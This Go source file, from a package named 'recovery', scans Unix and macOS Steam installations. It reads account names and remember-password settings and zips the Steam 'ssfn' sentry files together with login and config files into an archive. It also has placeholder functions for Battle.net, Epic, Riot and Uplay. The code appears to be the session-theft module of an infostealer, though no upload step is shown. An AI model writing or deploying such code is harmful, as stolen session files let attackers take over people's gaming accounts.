//go:build !windows

package recovery

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"recovery/recovery/types"
	"recovery/recovery/ziputil"
)

func pathExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func ScanGaming() *types.GamingResult {
	result := &types.GamingResult{
		Steam: scanSteamUnix(),
	}
	if result.Steam == nil {
		return nil
	}
	return result
}

func steamBasePaths() []string {
	home, _ := os.UserHomeDir()
	if runtime.GOOS == "darwin" {
		return []string{
			filepath.Join(home, "Library", "Application Support", "Steam"),
		}
	}
	return []string{
		filepath.Join(home, ".steam", "steam"),
		filepath.Join(home, ".local", "share", "Steam"),
		filepath.Join(home, ".steam", "debian-installation"),
	}
}

func scanSteamUnix() *types.SteamResult {
	var steamPath string
	for _, p := range steamBasePaths() {
		if pathExists(p) {
			steamPath = p
			break
		}
	}
	if steamPath == "" {
		return nil
	}

	result := &types.SteamResult{SteamPath: steamPath}

	configPath := filepath.Join(steamPath, "config", "loginusers.vdf")
	if data, err := os.ReadFile(configPath); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, `"AccountName"`) || strings.HasPrefix(line, `"accountname"`) {
				val := vdfValueUnix(line)
				if val != "" {
					result.Account = val
					result.AutoLogin = val
				}
			}
			if strings.HasPrefix(line, `"RememberPassword"`) {
				result.RememberPW = vdfValueUnix(line) == "1"
			}
		}
	}

	if entries, err := os.ReadDir(steamPath); err == nil {
		for _, e := range entries {
			if !e.IsDir() && strings.Contains(e.Name(), "ssfn") {
				result.SSFNFiles = append(result.SSFNFiles, e.Name())
			}
		}
	}

	seenGames := make(map[string]bool)
	scanSteamLibraryUnix(steamPath, result, seenGames)

	if result.Account == "" && len(result.Games) == 0 && len(result.SSFNFiles) == 0 {
		return nil
	}
	return result
}

func scanSteamLibraryUnix(steamPath string, result *types.SteamResult, seenGames map[string]bool) {
	libraryFolders := []string{steamPath}

	steamappsRoot := filepath.Join(steamPath, "steamapps")
	vdfPath := filepath.Join(steamappsRoot, "libraryfolders.vdf")
	if data, err := os.ReadFile(vdfPath); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(strings.ToLower(line), `"path"`) {
				val := vdfValueUnix(line)
				if val != "" && pathExists(val) && val != steamPath {
					libraryFolders = append(libraryFolders, val)
				}
			}
		}
	}

	for _, lib := range libraryFolders {
		libApps := filepath.Join(lib, "steamapps")
		if !pathExists(libApps) {
			continue
		}
		entries, _ := os.ReadDir(libApps)
		for _, e := range entries {
			if e.IsDir() || !strings.HasPrefix(e.Name(), "appmanifest_") || !strings.HasSuffix(e.Name(), ".acf") {
				continue
			}
			acfData, err := os.ReadFile(filepath.Join(libApps, e.Name()))
			if err != nil || len(acfData) == 0 {
				continue
			}
			acf := parseACFUnix(string(acfData))
			if acf["appid"] == "" || acf["name"] == "" {
				continue
			}
			if !seenGames[acf["appid"]] {
				seenGames[acf["appid"]] = true
				result.Games = append(result.Games, types.GameInfo{
					ID:        acf["appid"],
					Name:      acf["name"],
					Installed: acf["StateFlags"] != "4",
				})
			}
		}
	}
}

func parseACFUnix(data string) map[string]string {
	result := map[string]string{}
	var inBlock bool
	for _, line := range strings.Split(data, "\n") {
		line = strings.TrimLeft(line, "\t ")
		if line == "{" {
			inBlock = true
			continue
		}
		if line == "}" {
			break
		}
		if !inBlock || line == "" {
			continue
		}
		if strings.HasPrefix(line, `"`) {
			key := vdfNthQuotedUnix(line, 0)
			val := vdfNthQuotedUnix(line, 1)
			if key != "" {
				result[key] = val
			}
		}
	}
	return result
}

func vdfValueUnix(line string) string {
	return vdfNthQuotedUnix(line, 1)
}

func vdfNthQuotedUnix(line string, n int) string {
	count := 0
	i := 0
	for count <= n && i < len(line) {
		start := strings.Index(line[i:], `"`)
		if start == -1 {
			return ""
		}
		start += i + 1
		end := strings.Index(line[start:], `"`)
		if end == -1 {
			if count == n {
				return line[start:]
			}
			return ""
		}
		if count == n {
			return line[start : start+end]
		}
		i = start + end + 1
		count++
	}
	return ""
}

const maxZipFile = 50 * 1024 * 1024

func ZipSteamSession(steamPath string) ([]byte, error) {
	if steamPath == "" || !pathExists(steamPath) {
		return nil, os.ErrNotExist
	}

	var files []string
	entries, _ := os.ReadDir(steamPath)
	for _, e := range entries {
		if !e.IsDir() && strings.Contains(e.Name(), "ssfn") {
			if info, _ := e.Info(); info != nil && info.Size() < maxZipFile {
				files = append(files, filepath.Join(steamPath, e.Name()))
			}
		}
	}

	configDir := filepath.Join(steamPath, "config")
	for _, name := range []string{"loginusers.vdf", "config.vdf", "DialogConfig.vdf"} {
		p := filepath.Join(configDir, name)
		if pathExists(p) {
			files = append(files, p)
		}
	}

	if len(files) == 0 {
		return nil, os.ErrNotExist
	}
	return ziputil.ZipFiles(files, filepath.Dir(steamPath))
}

func ZipBattleNet() ([]byte, error) { return nil, os.ErrNotExist }
func ZipEpic() ([]byte, error)      { return nil, os.ErrNotExist }
func ZipRiot() ([]byte, error)       { return nil, os.ErrNotExist }
func ZipUplay() ([]byte, error)      { return nil, os.ErrNotExist }
